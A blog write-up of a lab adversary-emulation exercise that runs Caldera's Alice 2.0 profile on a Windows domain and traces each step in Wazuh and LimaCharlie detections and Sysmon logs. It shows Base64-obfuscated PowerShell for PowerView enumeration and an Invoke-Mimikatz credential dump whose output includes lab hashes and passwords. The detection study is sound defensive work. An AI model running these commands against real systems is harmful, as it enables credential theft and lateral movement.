+++
title = "[EN] Caldera Alice 2.0 Adversary Emulation"
date = "2025-09-30T19:28:28+02:00"
tags = ["caldera", "wazuh", "limacharlie", "edr", "windows", "siem", "soc"]
categories = ["SOC"]
author = "Soner Sahin"
image = "/images/calderaalice/cover.png"
+++ 

Hi everyone, In this article I will perform an attack scenario using Caldera and will show its effects in Wazuh (SIEM/XDR) and LimaCharlie (EDR).

LimaCharlie can integrate with the Atomic Red Team extension, which I will use in Caldera to perform the attack. Therefore, you don't need to install Atomic Red Team separately.

In my lab environment for this attack scenario, I have a Client1 machine and an AD-DC machine, and I have already installed Caldera agents on both.

Here is the basic topology.

- **client1 (Win10)**
- **AD-DC (WinSRV2022)**
- **Wazuh XDR/SIEM**
- **LimaCharlie EDR**

Here is the adversary template and attack scenario:

![alice](/images/calderaalice/1.png)

I'm going to use the "Alice 2.0" adversary template, which is a typical end-to-end attack scenario. I will run the attack through step 6; the remaining steps will not be executed.

In this case, I will make things a bit easier by starting and ending the attack within a defined time window and preparing the attack timeline across platforms. Thus, we will be able to focus on the effects of the attack.

Now, I will create a new operation as follows. 

![alice](/images/calderaalice/2.png)

The attack will be triggered as soon as I click the "Start" button and will be performed step by step automatically and as soon as it is done we will start investigating step by step.

As you can see in the image above, I will use Base64 as an obfuscator, which makes commands harder to read at a glance. I will include the decoded version of each command.

Let's do it.

**Timeline:**

```
Sep 30, 2025 @ 11:20:50 --- Sep 30, 2025 @ 11:33:00
```

![alice](/images/calderaalice/3.png)

## Step 1 - Discover local hosts:

**Base64:**
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA
```

**Decoded:**
```
Import-Module .\powerview.ps1;Get-DomainComputer
```
**Command Output:**
```
| Name             | Value                   | Score |
| ---------------- | ----------------------- | ----- |
| remote.host.fqdn | ad-dc.ssnrshnn.local    | 4     |
| remote.host.fqdn | client1.ssnrshnn.local  | 4     |
| remote.host.fqdn | client2.ssnrshnn.local  | 4     |
| remote.host.fqdn | exchange.ssnrshnn.local | 4     |
```

**LimaCharlie:**

Here is LimaCharlie's **Timeline** section, where you can find processes, DNS activity, network activity, and more in order.

As mentioned, there is a process called **Client1.exe** that lets us communicate with Caldera, and the commands will be executed through that process. 

Here is the timeline of the process creation.

![alice](/images/calderaalice/4.png)

**Event File:**

Here is the event file for the relevant process. The parent process is **Client1.exe**. 

![alice](/images/calderaalice/5.png)

**LimaCharlie Detection:**

Here is the output of LimaCharlie's Detections section for the first step. I disabled the Endpoint Protection Platform (**ext-epp**) to avoid quarantine actions and analyze the activity properly.

I enabled all default detection rules. I will present a sample for each step. The rules function as expected; additionally, the **ext-epp** module works well too.

![alice](/images/calderaalice/6.png)


**Detection Rules that are matched with relevant process:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

![alice](/images/calderaalice/7.png)

![alice](/images/calderaalice/8.png)

**Sysmon Output:**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:21:33.369
ProcessGuid: {46fa3f9b-a11d-68db-0805-000000000900}
ProcessId: 6536
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA"
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```

As you would have noticed that this is the first alert of the first command. Other than suricata traffic, Wazuh side is quieter as relatively default.

## Step 2 - Find Domain:

**Base64:**

```
powershell -Enc bgBiAHQAcwB0AGEAdAAgAC0AbgA=
```

**Decoded:**

```
nbtstat -n
```

**Command Output:**
```
Ethernet:
Node IpAddress: [10.1.2.10] Scope Id: []

                NetBIOS Local Name Table

       Name               Type         Status
    ---------------------------------------------
    CLIENT1        <00>  UNIQUE      Registered 
    SSNRSHNN       <00>  GROUP       Registered 
    CLIENT1        <20>  UNIQUE      Registered
```

**LimaCharlie:**

**nbtstat -n** command is used for find the domain name. Here is its process.
 
![alice](/images/calderaalice/9.png)

**Process Tree:**

With Tree View feature of the LimaCharlie, caching processes, sub processes are pretty easy and helps us to see the big picture.

![alice](/images/calderaalice/10.png)

**LimaCharlie Detection:**

In the **Detection** section, rules are doing their job well, and as you may realize, more than one rule has been triggered for the same process.

![alice](/images/calderaalice/11.png)


**Detection Rules that are matched with relevant process:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

![alice](/images/calderaalice/12.png)

![alice](/images/calderaalice/13.png)

**Sysmon Output:**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:22:20.277
ProcessGuid: {46fa3f9b-a14c-68db-0d05-000000000900}
ProcessId: 7132
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc bgBiAHQAcwB0AGEAdAAgAC0AbgA="
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```

Below you can see the relevant command which is **nbtstat -n**

![alice](/images/calderaalice/133.png)

**Sysmon Output:**

Sysmon output for the **nbtstat -n** command 

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:22:20.609
ProcessGuid: {46fa3f9b-a14c-68db-0f05-000000000900}
ProcessId: 9948
Image: C:\Windows\System32\nbtstat.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: TCP/IP NetBios Information
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: nbtinfo.exe
CommandLine: "C:\Windows\system32\nbtstat.exe" -n
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=004091B8024936FF322C11CF370F2184,SHA256=6210FA6ADE115DD07409CFAE21683B1772D6D3FDB6B438814CACBD3588DAD9E3,IMPHASH=207F3D1F113DEB58D9E4C6ACA8E0FA3F
ParentProcessGuid: {46fa3f9b-a14c-68db-0e05-000000000900}
ParentProcessId: 7624
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc bgBiAHQAcwB0AGEAdAAgAC0AbgA=
ParentUser: SSNRSHNN\goadmin"
```

## Step 3 - Discover Admins:

**Base64:**
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
```

**Decoded:**
```
Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName exchange.ssnrshnn.local
```
```
Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName client2.ssnrshnn.local
```
```
Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName client1.ssnrshnn.local
```
```
Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName ad-dc.ssnrshnn.local
```

**Command Output:**

In this step attacker aimed to collect local group membership informations for each host that have been found.

```
ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : EXCHANGE\Administrator
SID          : S-1-5-21-1945855000-140921441-2322798616-500
IsGroup      : False
IsDomain     : False

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Organization Management
SID          : S-1-5-21-2105100566-3451255-233295498-1111
IsGroup      : True
IsDomain     : True

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Exchange Trusted Subsystem
SID          : S-1-5-21-2105100566-3451255-233295498-1126
IsGroup      : True
IsDomain     : True
```

```
ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT2\Administrator
SID          : S-1-5-21-1149899384-3851703988-751053742-500
IsGroup      : False
IsDomain     : False

ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT2\client2
SID          : S-1-5-21-1149899384-3851703988-751053742-1001
IsGroup      : False
IsDomain     : False

ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True
```

```
ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT1\Administrator
SID          : S-1-5-21-4174197286-1528992158-1233857966-500
IsGroup      : False
IsDomain     : False

ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT1\client1
SID          : S-1-5-21-4174197286-1528992158-1233857966-1001
IsGroup      : False
IsDomain     : False

ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True
```

```
ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Administrator
SID          : S-1-5-21-2105100566-3451255-233295498-500
IsGroup      : False
IsDomain     : False

ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Enterprise Admins
SID          : S-1-5-21-2105100566-3451255-233295498-519
IsGroup      : True
IsDomain     : False

ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : False
```


**LimaCharlie:**

![alice](/images/calderaalice/14.png)

![alice](/images/calderaalice/15.png)

Above you can see the first command of the Step 3. Since rest of the processes that are associated with this step are same I will no put their screenshots.

**LimaCharlie Detection:**

First Process:

![alice](/images/calderaalice/22.png)


**Detection Rules that are matched with relevant processes:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

First Process:

![alice](/images/calderaalice/26.png)

**Sysmon Output**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:23:11.488
ProcessGuid: {46fa3f9b-a17f-68db-1205-000000000900}
ProcessId: 10668
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA="
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```

## Step 4 - Powercatz:

**Base64:**
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABpAG4AdgBvAGsAZQAtAG0AaQBtAGkALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=
```

**Decoded:**
```
Import-Module .\invoke-mimi.ps1;Invoke-Mimikatz -DumpCreds
```

**Command Output:**

This command is used for credential dumping—extracting passwords and authentication tokens from memory. In this attack, **Mimikatz** will read credentials from the **lsass** process.

```
  
  .#####.   mimikatz 2.2.0 (x64) #19041 Jun 16 2020 13:40:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 19027857 (00000000:01225791)
Session           : CachedInteractive from 1
User Name         : goadmin
Domain            : SSNRSHNN
Logon Server      : AD-DC
Logon Time        : 30/09/2025 09:18:58
SID               : S-1-5-21-2105100566-3451255-233295498-1106
	msv :	
	 [00000003] Primary
	 * Username : goadmin
	 * Domain   : SSNRSHNN
	 * NTLM     : [redacted]
	 * SHA1     : [redacted]
	 * DPAPI    : [redacted]
	tspkg :	
	wdigest :	
	 * Username : goadmin
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : goadmin
	 * Domain   : SSNRSHNN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 16672627 (00000000:00fe6773)
Session           : CachedInteractive from 1
User Name         : goadmin
Domain            : SSNRSHNN
Logon Server      : AD-DC
Logon Time        : 30/09/2025 09:06:30
SID               : S-1-5-21-2105100566-3451255-233295498-1106
	msv :	
	 [00000003] Primary
	 * Username : goadmin
	 * Domain   : SSNRSHNN
	 * NTLM     : [redacted]
	 * SHA1     : [redacted]
	 * DPAPI    : [redacted]
	tspkg :	
	wdigest :	
	 * Username : goadmin
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : goadmin
	 * Domain   : SSNRSHNN.LOCAL
	 * Password : Test123!
	ssp :	
	credman :	

Authentication Id : 0 ; 15732580 (00000000:00f00f64)
Session           : Interactive from 1
User Name         : client1
Domain            : SSNRSHNN
Logon Server      : AD-DC
Logon Time        : 30/09/2025 09:05:44
SID               : S-1-5-21-2105100566-3451255-233295498-1103
	msv :	
	 [00000003] Primary
	 * Username : client1
	 * Domain   : SSNRSHNN
	 * NTLM     : [redacted]
	 * SHA1     : [redacted]
	 * DPAPI    : [redacted]
	tspkg :	
	wdigest :	
	 * Username : client1
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : client1
	 * Domain   : SSNRSHNN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 67841 (00000000:00010901)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : [redacted]
	 * SHA1     : [redacted]
	 * DPAPI    : [redacted]
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : CLIENT1$
	 * Domain   : ssnrshnn.local
	 * Password : [redacted]
	ssp :	
	credman :	

Authentication Id : 0 ; 67810 (00000000:000108e2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : [redacted]
	 * SHA1     : [redacted]
	 * DPAPI    : [redacted]
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : CLIENT1$
	 * Domain   : ssnrshnn.local
	 * Password : hus?Z=m<'7zC!!(9FefUrzUrEXL*,1:>#XwO?b&!<s##''9i_"DcF.o@Y;Y-4M#jp9r[:11_PbY<\aVxsYe3r)?fYR^'it: OFl#AblR0iI;(.4fWy=)ViLD
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT1$
Domain            : SSNRSHNN
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : client1$
	 * Domain   : SSNRSHNN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 42918 (00000000:0000a7a6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : CLIENT1$
	 * Domain   : ssnrshnn.local
	 * Password : hus?Z=m<'7zC!!(9FefUrzUrEXL*,1:>#XwO?b&!<s##''9i_"DcF.o@Y;Y-4M#jp9r[:11_PbY<\aVxsYe3r)?fYR^'it: OFl#AblR0iI;(.4fWy=)ViLD
	ssp :	
	credman :	

Authentication Id : 0 ; 42896 (00000000:0000a790)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : CLIENT1$
	 * Domain   : ssnrshnn.local
	 * Password : hus?Z=m<'7zC!!(9FefUrzUrEXL*,1:>#XwO?b&!<s##''9i_"DcF.o@Y;Y-4M#jp9r[:11_PbY<\aVxsYe3r)?fYR^'it: OFl#AblR0iI;(.4fWy=)ViLD
	ssp :	
	credman :	

Authentication Id : 0 ; 41071 (00000000:0000a06f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT1$
Domain            : SSNRSHNN
Logon Server      : (null)
Logon Time        : 30/09/2025 08:40:58
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : CLIENT1$
	 * Domain   : SSNRSHNN
	 * Password : (null)
	kerberos :	
	 * Username : client1$
	 * Domain   : SSNRSHNN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

mimikatz(powershell) # exit
Bye!
```

**LimaCharlie:**

![alice](/images/calderaalice/27.png)

**Process Tree:**

![alice](/images/calderaalice/31.png)

Here is the sensitive **lsass** process used by the attacker, which is part of this attack as well:

![alice](/images/calderaalice/301.png)

```json
"event":{
"EVENTS":[
{
"event":{
"BASE_ADDRESS":140695010410496
"COMMAND_LINE":"C:\Windows\system32\lsass.exe"
"CREATION_TIME":1759214458410
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\system32\lsass.exe"
"HASH":"055a1226a769948a79ed0972bdee2d91937c4b521e0b9046f9b8ccc63d110115"
"MEMORY_USAGE":18059264
"PARENT":{
"FILE_IS_SIGNED":1
"FILE_PATH":"\Device\HarddiskVolume3\Windows\System32\wininit.exe"
"HASH":"ba26910be549b8700c08fbe2f160952288864470a30dd35c3c6b7782f7dbf857"
"MEMORY_USAGE":7294976
"PARENT_PROCESS_ID":468
"PROCESS_ID":556
"THIS_ATOM":"3967514abcef88b71ac5fb8c68db7bc6"
"THREADS":5
"TIMESTAMP":1759214534730
"USER_NAME":"NT AUTHORITY\SYSTEM"
}
"PARENT_PROCESS_ID":556
"PROCESS_ID":724
"THREADS":18
"USER_NAME":"NT AUTHORITY\SYSTEM"
}
"routing":{
"arch":2
"did":""
"event_id":"6e73c01f-a6d0-43cf-bb9a-d65b1ac5ac9f"
"event_time":1759214534808
"event_type":"EXISTING_PROCESS"
"ext_ip":"79.238.92.208"
"hostname":"client1.ssnrshnn.local"
"iid":"9b03d810-e114-4352-9392-a1186feb7894"
"int_ip":"10.1.2.10"
"latency":9894730
"moduleid":2
"oid":"c73795e0-a62c-4854-9462-be3d08769aa1"
"parent":"3967514abcef88b71ac5fb8c68db7bc6"
"plat":268435456
"sid":"23bf4a39-63f5-4808-8a3a-772460439fe4"
"tags":[
"windows"
]
"this":"bc44a81e80f8a296c46926a068db7bc6"
}
}
{
"event":{
"ACCESS_FLAGS":4112
"PARENT_PROCESS_ID":11252
"PROCESS_ID":724
"SOURCE":{
"BASE_ADDRESS":140698751074304
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABpAG4AdgBvAGsAZQAtAG0AaQBtAGkALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHU…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":55980032
"PARENT_ATOM":"93f03d982581d01a60b06cba68dba265"
"PARENT_PROCESS_ID":3216
"PROCESS_ID":11252
"THIS_ATOM":"cc8071e656660e7cce7b8b8a68dba265"
"THREADS":19
"TIMESTAMP":1759224420994
"USER_NAME":"SSNRSHNN\goadmin"
}
"TARGET":{
"BASE_ADDRESS":140695010410496
"COMMAND_LINE":"C:\Windows\system32\lsass.exe"
"CREATION_TIME":1759214458410
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\system32\lsass.exe"
"HASH":"055a1226a769948a79ed0972bdee2d91937c4b521e0b9046f9b8ccc63d110115"
"MEMORY_USAGE":18059264
"PARENT_ATOM":"3967514abcef88b71ac5fb8c68db7bc6"
"PARENT_PROCESS_ID":556
"PROCESS_ID":724
"THIS_ATOM":"bc44a81e80f8a296c46926a068db7bc6"
"THREADS":18
"TIMESTAMP":1759214534808
"USER_NAME":"NT AUTHORITY\SYSTEM"
}
}
"routing":{
"arch":2
"did":""
"event_id":"512d1106-bfd7-4502-8322-3a93ae528dd3"
"event_time":1759224428796
"event_type":"REMOTE_PROCESS_HANDLE"
"ext_ip":"79.238.92.208"
"hostname":"client1.ssnrshnn.local"
"iid":"9b03d810-e114-4352-9392-a1186feb7894"
"int_ip":"10.1.2.10"
"latency":742
"moduleid":2
"oid":"c73795e0-a62c-4854-9462-be3d08769aa1"
"parent":"cc8071e656660e7cce7b8b8a68dba265"
"plat":268435456
"sid":"23bf4a39-63f5-4808-8a3a-772460439fe4"
"tags":[
"windows"
]
"target":"bc44a81e80f8a296c46926a068db7bc6"
"this":"c70d30c812b50e428fb9298e68dba26d"
}
}
]
}
```

**LimaCharlie Detection:**

![alice](/images/calderaalice/32.png)

Suspicious **lsass** detection by soteria edr rules.

![alice](/images/calderaalice/33.png)

Let me have this process interpreted by AI in Detection > relevantLsassProcess > AI Explain.

![alice](/images/calderaalice/34.png)

As you can see in the image above, LimaCharlie has an AI module that makes things much easier by explaining the alert, TTPs, investigation steps, and more.


**Detection Rules that are matched with relevant processes:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

![alice](/images/calderaalice/35.png)


![alice](/images/calderaalice/37.png)

**Sysmon Output**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:26:59.823
ProcessGuid: {46fa3f9b-a263-68db-1c05-000000000900}
ProcessId: 3216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
